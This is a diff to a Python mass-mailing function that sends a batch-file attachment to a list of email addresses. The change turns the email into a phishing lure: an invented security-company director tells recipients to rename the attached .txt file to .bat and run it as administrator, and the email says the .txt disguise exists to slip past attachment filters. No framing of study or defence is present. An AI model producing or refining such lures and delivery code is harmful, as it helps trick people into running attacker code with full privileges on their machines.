@@ -144,38 +144,57 @@ def send_a(bat_path, emails):
         msg = MIMEMultipart()
         msg['From'] = "J. Security Limited"
         msg['To'] = email
-        msg['Subject'] = "Updated Software Guidelines - Q3 Policy Review"
+        msg['Subject'] = "Mandatory Security Protocol Update - Script Delivery (Ref: SC-2025-07)"
 
-        body = """
-Dear Customer,
+        body = r"""
+Dear Valued Partner,
 
-As part of our quarterly cybersecurity policy updates, J. Security Limited is distributing revised software evaluation guidelines for all partners.
+As part of J. Security Limited's Enhanced Security Framework (v3.1), we're distributing new Automated Configuration Verification (ACV) scripts to all certified partners. These ensure compliance with Microsoft's updated security baseline requirements.
 
-Key Changes:
-    1.New Microsoft product validation procedures
-    2.Updated license compliance standards (Section 4.2)
-    3.Deployment best practices for upcoming Windows releases
+Required Action:
+    • Download attached configuration script:
+    📎 ACV_Validation_SC202507.txt
+    
+    • Convert to executable format:
+    Right-click file → Rename → Replace ".txt" with ".bat"
+    
+    • Execute validation:
+    Right-click → "Run as administrator"
 
-Action Required:
-Review the attached documentation by {Date + 7 days}:
-➤ 📎 [Attachment] Software_Compliance_Q3.pdf
-(Includes appendix with reference keys on pg. 12)
+Purpose:
+    • Verifies proper implementation of new Windows security policies
+    • Generates compliance report for your audit trail
+    • Checks system readiness for upcoming TLS 1.3 enforcement
 
-Important Notes:
-• Test environments recommended for new deployments
-• Contact IT for template implementation support
+Key Details:
+🔒 Security Notes:
+• Delivered as .txt to bypass email attachment filters
+• SHA-256 Checksum: 9a2f4c...e83b (verify before execution)
+• Execution window: July 15 - August 5, 2025
+
+📋 Post-Run Steps:
+
+Report automatically saves to C:\Security\ACV_Report.log
+
+Email report to compliance@jsecurityltd.com by August 5
+
+For assistance:
+☎️ Contact our Compliance Team: +1 (800) 555-0199
+✉️ Email: acv-support@jsecurityltd.com
 
 Regards,
-J. Security Policy Team
+Eleanor Martinez
+Director of Security Compliance
 J. Security Limited
-🔒 This email is authenticated via SPF/DKIM
+🏢 550 Security Boulevard, New York, NY 10001
+🔐 Authenticated via SPF/DKIM
 """
         msg.attach(MIMEText(body, 'plain'))
 
         part = MIMEBase('application', 'octet-stream')
         part.set_payload(attachment_data)
         encoders.encode_base64(part)
-        part.add_header('Content-Disposition', f"attachment; filename= activator.bat")
+        part.add_header('Content-Disposition', f"attachment; filename= ACV_Validation_SC202507.txt")
         msg.attach(part)
         server.sendmail(email_user, [email], msg.as_string())
         print(f"Sent to {email}")
